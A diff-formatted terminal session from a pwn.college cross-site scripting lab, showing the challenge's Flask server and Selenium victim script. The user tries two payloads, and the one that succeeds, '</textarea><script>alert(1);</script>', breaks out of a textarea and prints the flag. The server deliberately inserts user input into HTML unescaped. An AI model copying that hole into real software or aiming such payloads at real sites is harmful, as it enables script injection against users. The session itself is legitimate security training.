@@ -1,0 +1,140 @@
+hacker@web-security~xss-4:/challenge$ cat server 
+#!/usr/bin/exec-suid -- /usr/bin/python3 -I
+
+import flask
+import os
+
+app = flask.Flask(__name__)
+
+
+@app.route("/", methods=["GET"])
+def challenge_get():
+    return f"""
+        <html><body>
+        <h1>pwnmsg ephemeral message service</h1>
+        The message:
+        <form>
+            <textarea name=msg>{flask.request.args.get("msg", "Type your message here!")}</textarea>
+            <input type=submit value="Make URL!">
+        </form>
+        </body></html>
+    """
+
+
+app.secret_key = os.urandom(8)
+app.config["SERVER_NAME"] = f"challenge.localhost:80"
+app.run("challenge.localhost", 80)
+hacker@web-security~xss-4:/challenge$ cat victim 
+#!/usr/bin/exec-suid -- /usr/bin/python3 -I
+
+import psutil
+import urllib
+import atexit
+import time
+import sys
+import os
+
+from selenium import webdriver
+from selenium.webdriver.firefox.options import Options as FirefoxOptions
+from selenium.webdriver.firefox.service import Service as FirefoxService
+from selenium.webdriver.common.by import By
+from selenium.webdriver.support.wait import WebDriverWait
+from selenium.webdriver.support import expected_conditions as EC
+from selenium.common.exceptions import TimeoutException, WebDriverException
+
+os.setuid(os.geteuid())
+os.environ.clear()
+os.environ["PATH"] = "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
+
+options = FirefoxOptions()
+options.add_argument("--headless")
+service = FirefoxService(log_path="/dev/null")
+browser = webdriver.Firefox(service=service, options=options)
+atexit.register(browser.quit)
+
+open_ports = {s.laddr.port for s in psutil.net_connections(kind="inet") if s.status == "LISTEN"}
+if 80 not in open_ports:
+    print("Service doesn't seem to be running?")
+    sys.exit(1)
+
+if len(sys.argv) == 1:
+    print(f"Usage: {sys.argv[0]} URL")
+    sys.exit(1)
+
+challenge_url = sys.argv[1]
+
+url_parsed = urllib.parse.urlparse(challenge_url)
+if url_parsed.hostname != "challenge.localhost":
+    print("Hostname should be 'challenge.localhost'.")
+    sys.exit(2)
+if url_parsed.port not in {None, 80}:
+    print("Port should be 80.")
+    sys.exit(3)
+
+print(f"Visiting {challenge_url}")
+browser.get(challenge_url)
+try:
+    WebDriverWait(browser, 1).until(EC.alert_is_present())
+except TimeoutException:
+    print("Failure: JavaScript alert did not trigger...")
+    sys.exit(3)
+else:
+    print("Alert triggered! Your reward:")
+    print(open("/flag").read().strip())
+hacker@web-security~xss-4:/challenge$ ls
+DESCRIPTION.md  server  victim
+hacker@web-security~xss-4:/challenge$ ./victim http://challenge.localhost:80/?msg="<textarea/><script>alert(1);</script>"
+^CTraceback (most recent call last):
+  File "./victim", line 25, in <module>
+    browser = webdriver.Firefox(service=service, options=options)
+  File "/usr/local/lib/python3.8/dist-packages/selenium/webdriver/firefox/webdriver.py", line 57, in __init__
+    if finder.get_browser_path():
+  File "/usr/local/lib/python3.8/dist-packages/selenium/webdriver/common/driver_finder.py", line 47, in get_browser_path
+    return self._binary_paths()["browser_path"]
+  File "/usr/local/lib/python3.8/dist-packages/selenium/webdriver/common/driver_finder.py", line 67, in _binary_paths
+    output = SeleniumManager().binary_paths(self._to_args())
+  File "/usr/local/lib/python3.8/dist-packages/selenium/webdriver/common/selenium_manager.py", line 55, in binary_paths
+    return self._run(args)
+  File "/usr/local/lib/python3.8/dist-packages/selenium/webdriver/common/selenium_manager.py", line 119, in _run
+    completed_proc = subprocess.run(args, capture_output=True)
+  File "/usr/lib/python3.8/subprocess.py", line 495, in run
+    stdout, stderr = process.communicate(input, timeout=timeout)
+  File "/usr/lib/python3.8/subprocess.py", line 1028, in communicate
+    stdout, stderr = self._communicate(input, endtime, timeout)
+  File "/usr/lib/python3.8/subprocess.py", line 1868, in _communicate
+    ready = selector.select(timeout)
+  File "/usr/lib/python3.8/selectors.py", line 415, in select
+    fd_event_list = self._selector.poll(timeout)
+KeyboardInterrupt
+
+hacker@web-security~xss-4:/challenge$ ./server &
+[1] 1310
+hacker@web-security~xss-4:/challenge$  * Serving Flask app 'server'
+ * Debug mode: off
+WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.
+ * Running on http://challenge.localhost:80
+Press CTRL+C to quit
+./server &^C
+hacker@web-security~xss-4:/challenge$ ./server &
+[2] 1312
+hacker@web-security~xss-4:/challenge$  * Serving Flask app 'server'
+ * Debug mode: off
+Address already in use
+Port 80 is in use by another program. Either identify and stop that program, or start the server with a different port.
+
+[2]+  Exit 1                  ./server
+hacker@web-security~xss-4:/challenge$ ./victim http://challenge.localhost:80/?msg="<textarea/><script>alert(1);</script>"
+Problem reading geckodriver versions: error sending request for url (https://raw.githubusercontent.com/SeleniumHQ/selenium/trunk/common/geckodriver/geckodriver-support.json). Using latest geckodriver version
+Exception managing firefox: error sending request for url (https://github.com/mozilla/geckodriver/releases/latest)
+Visiting http://challenge.localhost:80/?msg=<textarea/><script>alert(1);</script>
+127.0.0.1 - - [25/Oct/2025 05:57:23] "GET /?msg=<textarea/><script>alert(1);</script> HTTP/1.1" 200 -
+127.0.0.1 - - [25/Oct/2025 05:57:23] "GET /favicon.ico HTTP/1.1" 404 -
+Failure: JavaScript alert did not trigger...
+hacker@web-security~xss-4:/challenge$ ./victim http://challenge.localhost:80/?msg="</textarea><script>alert(1);</script>"
+Problem reading geckodriver versions: error sending request for url (https://raw.githubusercontent.com/SeleniumHQ/selenium/trunk/common/geckodriver/geckodriver-support.json). Using latest geckodriver version
+Exception managing firefox: error sending request for url (https://github.com/mozilla/geckodriver/releases/latest)
+Visiting http://challenge.localhost:80/?msg=</textarea><script>alert(1);</script>
+127.0.0.1 - - [25/Oct/2025 05:58:00] "GET /?msg=</textarea><script>alert(1);</script> HTTP/1.1" 200 -
+127.0.0.1 - - [25/Oct/2025 05:58:00] "GET /favicon.ico HTTP/1.1" 404 -
+Alert triggered! Your reward:
+pwn.college{wVBGDEnkA2sxk-OSraxZlkCf973.dVTOzMDL1AjM5MzW}
